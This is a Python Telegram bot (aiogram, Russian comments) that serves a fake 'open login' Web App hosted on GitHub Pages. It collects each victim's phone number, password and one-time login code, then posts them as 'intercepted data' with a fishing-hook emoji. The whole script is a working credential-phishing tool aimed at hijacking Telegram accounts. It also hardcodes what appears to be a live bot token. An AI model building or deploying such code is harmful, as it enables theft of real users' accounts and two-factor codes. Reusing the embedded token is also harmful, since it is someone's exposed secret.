import asyncio
import logging
import json
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import (
    WebAppInfo,
    ReplyKeyboardMarkup,
    KeyboardButton  # <--- Важное изменение
)

# ==========================================
# 👇 ВСТАВЬ СЮДА СВОИ ДАННЫЕ 👇
# ==========================================
BOT_TOKEN = "8563110236:AAEO8GlnHVxtsMjbaiQ-EuHq7hphAaMzXL0"
# Ссылка должна быть https и вести на index.html
WEB_APP_URL = "https://vanchopiki.github.io/test/"
# ==========================================

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


# 1. Команда /start
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    # Создаем КЛАВИАТУРУ НИЖНЕГО МЕНЮ (Reply)
    # Только с ней работает sendData
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(
                    text="📱 Открыть вход",
                    web_app=WebAppInfo(url=WEB_APP_URL)
                )
            ]
        ],
        resize_keyboard=True  # Делаем кнопку поменьше
    )

    await message.answer(
        "Нажми кнопку внизу экрана 👇",
        reply_markup=keyboard
    )


# 2. Ловим данные
# В aiogram 3.x фильтр выглядит так: F.web_app_data
@dp.message(F.web_app_data)
async def get_web_app_data(message: types.Message):
    try:
        # Получаем данные
        data = json.loads(message.web_app_data.data)

        phone = data.get('phone', '-')
        password = data.get('password', '-')
        code = data.get('code', '-')

        text = (
            "🎣 <b>Данные перехвачены!</b>\n\n"
            f"📱 <b>Телефон:</b> <code>{phone}</code>\n"
            f"🔐 <b>Пароль:</b> <code>{password}</code>\n"
            f"🔢 <b>Код:</b> <code>{code}</code>"
        )

        await message.answer(text, parse_mode="HTML")

    except Exception as e:
        await message.answer(f"Ошибка при чтении: {e}")


async def main():
    print("Бот запущен! Перезапусти его в Телеграм через /start")
    await dp.start_polling(bot)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Бот выключен.")